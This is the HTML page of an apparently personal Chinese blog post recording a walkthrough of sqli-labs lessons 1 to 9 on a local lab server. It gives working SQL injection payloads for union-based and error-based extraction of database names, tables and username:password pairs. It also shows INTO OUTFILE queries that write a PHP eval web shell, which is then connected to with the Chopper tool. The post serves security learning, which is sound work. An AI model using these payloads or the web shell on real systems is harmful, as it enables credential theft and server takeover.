@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="💗zihao">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="💗zihao">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="Saying and doing are two different things.">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>通过sql-labs进行sql注入学习(1-10) · Lemon&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Lemon&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">通过sql-labs进行sql注入学习(1-10)</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Lemon's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/744896.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            通过sql-labs进行sql注入学习(1-10)
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+                Record my learning process of SQL-labs.
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="SQL注入">SQL注入</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.8k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/06/09</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>SQL注入有很多方法，先接触最简单最直观的一种——<strong>联合查询注入</strong></p>
+<p><strong>联合查询注入原理</strong><br>联合查询的前提是需要有<strong>显示位</strong>，而显示位就是通过用户的查询从<strong>数据库中返回到页面的数据</strong>，是可变化的。<br> 例如：sql-labs前四关都是联合查询注入</p>
+<h6 id="sql-labs-一"><a href="#sql-labs-一" class="headerlink" title="sql-labs(一)"></a><strong>sql-labs(一)</strong></h6><p><img src="http://i2.tiimg.com/690112/076773b2218fa22d.png" alt="在这里插入图片描述"><br> 输入id=1或id=2，都会返回数据，而且返回的数据不相同。<br> 接下来就开始实战，通过实战来了解<strong>联合查询注入的步骤和方法</strong>。</p>
+<p> <strong>一、判断注入点</strong><br> 闭合符号一般是<code>&#39;</code>,<code>&quot;</code>,或<code>无闭合符号</code>或<code>&#39;)</code>，<code>&quot;)</code><br> <code>--+</code>为注释符号<br> 在url框中输入<code>?id=2&#39;</code>，发现<br><img src="http://i2.tiimg.com/690112/412afbaf07f69ab2.png" alt="在这里插入图片描述"><br> 用<code>--+</code>将后面的字符注释掉，发现<br><img src="http://i2.tiimg.com/690112/fb3547f78d47c81e.png" alt="在这里插入图片描述"><br> 正常显示，说明注入点是单引号。<br><strong>二、判断列数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 4--+</span></span><br></pre></td></tr></table></figure></p>
+<p>发现<br> <img src="http://i2.tiimg.com/690112/58fb1298ce202c03.png" alt="在这里插入图片描述"><br> 一共三列，接下来就开始联合查询。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+</span></span><br></pre></td></tr></table></figure></p>
+<p>这里将<code>id</code>等于一个数据库不存在的数，通过联合查询能看出我们输入的数据在哪里能够显示出来。<br><img src="http://i2.tiimg.com/690112/9898eef63b75020c.png" alt="在这里插入图片描述"><br>在<code>2，3</code>的位置我们便可插入我们想用的语句了。</p>
+<p><strong>三、爆数据库</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure></p>
+<p>通过一个<code>database()</code>函数便可获知当前数据库。<br><img src="http://i2.tiimg.com/690112/7bc8e18823f438fd.png" alt="在这里插入图片描述"><br><strong>四、爆数据表</strong></p>
+<blockquote>
+<p>在此之前，我们要知道在MySQL中有<code>information_schema</code>这个库，该库存放了所有数据库的信息。<br>information_schema.columns包含所有表的字段<br>    table_schema                数据库名<br>    table_name                  表名<br>    column_name                 列名<br>    information_schema.tables包含所有库的表名<br>    table_schema                数据库名<br>    table_name                  表名<br>    information_schema.schemata包含所有数据库的名<br>    schema_name                 数据库名<br>    group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>了解之后，才会更明白一些语句为何这样那样构造，接下来就开始查询数据表。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="http://i2.tiimg.com/690112/2f12a326de24eed7.png" alt="在这里插入图片描述"><br><strong>五、爆字段</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+</span></span><br></pre></td></tr></table></figure></p>
+<p> 也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://img-blog.csdnimg.cn/20190602205152176.png" alt="在这里插入图片描述"><br> <strong>六、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure></p>
+<p><code>0x3a</code>是<code>:</code>用来区分用户名和密码，不至于混淆。<br><img src="http://i2.tiimg.com/690112/895fc0a333cfa07d.png" alt="在这里插入图片描述"><br>这样，用户名和密码就爆出来了。</p>
+<h6 id="sql-labs-二"><a href="#sql-labs-二" class="headerlink" title="sql-labs(二)"></a><strong>sql-labs(二)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p>无闭合符号</p>
+<h6 id="sql-labs-三"><a href="#sql-labs-三" class="headerlink" title="sql-labs(三)"></a><strong>sql-labs(三)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p>闭合符号为<code>&#39;)</code></p>
+<h6 id="sql-labs-四"><a href="#sql-labs-四" class="headerlink" title="sql-labs(四)"></a><strong>sql-labs(四)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-4/?id=1") order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p>闭合符号为<code>&quot;)</code><br><img src="http://i2.tiimg.com/690112/1e696d4ab106e2bd.png" alt="在这里插入图片描述"><br>其他步骤与第一关相同，这里就不阐述了。</p>
+<p>接下来介绍第二种注入方式——<strong>报错注入</strong><br><strong>报错注入原理</strong><br>报错注入是基于没有回显数据，只有报错语句的基础上才使用，例如sql-labs的第五关。<br><img src="http://i2.tiimg.com/690112/a7df2e3b8fa5e23d.png" alt="在这里插入图片描述"><br>这里即使id输入正确，也只会显示一个YOU are in……，但如果输入错误的语句时，会出现报错语句。<br><img src="http://i2.tiimg.com/690112/fe7ac54965906da2.png" alt="在这里插入图片描述"><br><strong>那思路来了，我们可以故意构造报错语句，其中插入我们想要的语句，这样即使报错了，在语句中也含有我们想要的数据。</strong><br>网上有很多常见的报错注入语句，但是要理解原理，才能更好的使用这些语句。<br><strong>一、Duplicate entry报错</strong><br>报错注入的经典语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> select <span class="number">1</span>,count(*),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.columns group by x;–+</span><br><span class="line">version()可以替换为需要查询的信息。</span><br></pre></td></tr></table></figure></p>
+<p>简化语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,count(*)  from information_schema.<span class="function">columns group by <span class="title">concat</span><span class="params">(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))</span></span>;–+</span><br></pre></td></tr></table></figure></p>
+<p>在使用之前，我们要知道一些函数的作用</p>
+<blockquote>
+<p>Count()计算总数<br>Concat()连接字符串<br>Floor()向下取整数<br>Rand()产生0～1的随机数<br>rand(0)序列是011011<br>group by a  会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组</p>
+</blockquote>
+<p>这里看了很多大佬的博客，搞清楚了Duplicate entry报错的原理。<br><code>union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+</code><br>网上最常见的语句就是这个，但为何报错？？ 因为count(<em>)和floor(rand(0)</em>2)的位置问题吗？？，其实不是的，这里也就不饶弯子了。其实<strong>报错的原因在与<code>rand()</code>函数在查询的时候会执行了一次，而插入的时候又会执行一次，group by 创建的临时表，第一次查询是0，,因为是空表所以插入这条,而插入的时候rand()又执行了一次，再执行一次因为表中已经有数据1，那么新添加的数据相加变成2，这里相当已经执行了三次（但其实是二次），所以011011就又排到0了，到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了此时插入因为重复出现同一个key,就会出现报错 重复出现key</strong>。<br><img src="http://i2.tiimg.com/690112/2a92c961ed9c9c66.png" alt="在这里插入图片描述"><img src="http://i2.tiimg.com/690112/9b33ca9c03f501ef.png" alt="在这里插入图片描述"><br>所以这也是为何floor(rand(0)*2)报错是有条件的，记录必须3条以上的原因<br><img src="http://i2.tiimg.com/690112/81d71440c654940e.png" alt="在这里插入图片描述"><br>这里我们觉得可以多去看看大佬的博客，他们写的真的非常详细，例如：<br><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">MYSQL报错注入原理</a><br><a href="https://www.freebuf.com/column/158705.html" target="_blank" rel="noopener">sql注入之报错注入</a><br><a href="https://www.cnblogs.com/Triomphe/p/9489639.html" target="_blank" rel="noopener">MYSQL常见注入原理</a><br>懂其原理，便可做题。</p>
+<h6 id="sql-labs-五"><a href="#sql-labs-五" class="headerlink" title="sql-labs(五)"></a><strong>sql-labs(五)</strong></h6><p> 首先判断出单引号闭合<br> 利用经典语句<br> <strong>一、爆出数据库</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=2' union select 1,2,count(*)  from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+</span></span><br></pre></td></tr></table></figure>
+<p>这里要注意的是报错语句会出现一个1，有时可能弄混淆，所以我们加上<code>0x3a</code>即<code>:</code>来隔开这个1。<br><img src="http://i2.tiimg.com/690112/0319160a138faac0.png" alt="在这里插入图片描述"><br>报错语句中又我们想要的信息，数据库名，接下来就爆表名。<br><strong>二、爆表名</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/39ff19c600e475a1.png" alt="在这里插入图片描述"><br>爆出我们想要的表名<br><strong>三、爆字段值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/5c5d00ce79906e11.png" alt="在这里插入图片描述"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/8bf1006ffa24ef71.png" alt="在这里插入图片描述"><br>爆出了字段</p>
+<p><strong>四、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select username from users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/aef93ea0902a4ff8.png" alt="在这里插入图片描述"><br> 这样就爆出用户名和密码了。</p>
+<h6 id="sql-labs-六"><a href="#sql-labs-六" class="headerlink" title="sql-labs(六)"></a><strong>sql-labs(六)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-6/?id=2" union select 1,2,count(*)  from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+</span></span><br></pre></td></tr></table></figure>
+<p>闭合符号为<code>&quot;</code><img src="http://i2.tiimg.com/690112/bfd9a488e0abe83f.png" alt="在这里插入图片描述"><br>其它的步骤与sql-labs(五)相同，一步一步就可以爆出你想要的信息。</p>
+<p>通过第七关学到了很多东西，<strong>菜刀</strong>的使用，而且学到一种注入方法。<br><img src="http://i2.tiimg.com/690112/ec22259268f79af3.png" alt="在这里插入图片描述"><br>首先就先首先菜刀的方法，这个贼过瘾。。。<br>之前总看大佬的博客中有<strong>一句话</strong>，我都不知道是什么意思今天终于搞清楚了一些，就先用第七关来练习一下。<br><strong>第一种方法-使用菜刀</strong><br><strong>一、判断注入点</strong><br><img src="http://i2.tiimg.com/690112/05ee7d15799660bc.png" alt="在这里插入图片描述"><br>但这时的报错语句已经统一规范成这样了，所以只有挨个试。<br>试出来注入点为<code>1&#39;))</code><br><strong>二、查列数</strong><br>一共三列<br><strong>三、构造一句话</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,'&lt;?php @eval($_POST["mi"])?&gt;',user() into outfile "D://6.php"--+</span></span><br></pre></td></tr></table></figure></p>
+<p>注意这里将上传文件路径改为phpstudy的根目录，其他目录菜刀连接时会没有权限。<br><img src="http://i2.tiimg.com/690112/a7f023ebbe24acf0.png" alt="在这里插入图片描述"><br>将一句话文件上传到根目录后，开始动用菜刀，右键点击添加。<br><img src="http://i2.tiimg.com/690112/635bb566f353db1e.png" alt="在这里插入图片描述"><br><strong>地址</strong>填入你上传文件的地址<br><img src="http://i2.tiimg.com/690112/dee35b79aaac453d.png" alt="在这里插入图片描述"><br>后面的小框中填入一句话中构造的<strong>密码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&lt;?php @eval($_POST[&quot;mi&quot;])?&gt;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>如：我构造的密码为mi<br>点击连接<br><img src="http://i2.tiimg.com/690112/fb9c395aec807907.png" alt="在这里插入图片描述"><br>这多过瘾，比慢慢爆出数据库过瘾多了，这直接进入服务器了。</p>
+<p><strong>第二种方法-手工注入</strong><br>只要判断出了闭合符号，其他按照那些固定的语句来吧。<br><strong>一、爆列</strong><br>这个就不演示了，一共就三列。<br><strong>二、爆表</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,table_name,3 from information_schema.tables where table_schema='security'  into outfile "D://SQL//7.php"--+</span></span><br></pre></td></tr></table></figure></p>
+<p>去D盘的SQL目录中查看文件<br><img src="http://i2.tiimg.com/690112/911824e75e8ca90a.png" alt="在这里插入图片描述"><br>果然显示出来了<br><strong>三、爆字段</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 into outfile "D://SQL//8.php"--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/0ae0de3e7a3bb0c3.png" alt="在这里插入图片描述"><br><strong>四、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,group_concat(username,0x3a,password),3 from users into outfile "D://SQL//9.php"--+</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/9f1f1ce31debfb99.png" alt="在这里插入图片描述"><br>会发现这些语句都是固定不变的，变的只是一些注入方式而已，所以懂得原理很重要。</p>
+<h6 id="sql-labs-八"><a href="#sql-labs-八" class="headerlink" title="sql-labs(八)"></a><strong>sql-labs(八)</strong></h6><p>与第七关不同的就是没有了报错提醒<br><img src="http://i2.tiimg.com/690112/a93ed78e13180254.png" alt="在这里插入图片描述"><br>闭合符号为：<code>&#39;</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-8/?id=1' union select 1,'&lt;?php @eval($_POST["mi"])?&gt;',user() into outfile "D://8.php"--+</span></span><br></pre></td></tr></table></figure>
+<p>利用<strong>一句话</strong>和第七关相同。<br>手工注入的话和第七关的方法相同，这里就不演示了<br><img src="http://i2.tiimg.com/690112/445e88bc8993208b.png" alt="在这里插入图片描述"></p>
+<p>接下来就要学习一种新的注入方式，<strong>时间延时盲注</strong>，具体通过第九关来看。</p>
+<h6 id="sql-labs-九"><a href="#sql-labs-九" class="headerlink" title="sql-labs(九)"></a><strong>sql-labs(九)</strong></h6><p>在第九关中，无论我们怎么判断闭合符号，其显示的只是<br><img src="http://i2.tiimg.com/690112/29d6f77ac8fdcba6.png" alt="在这里插入图片描述"><br>因此我们需要换一种方式来查看到底那个是闭合符号</p>
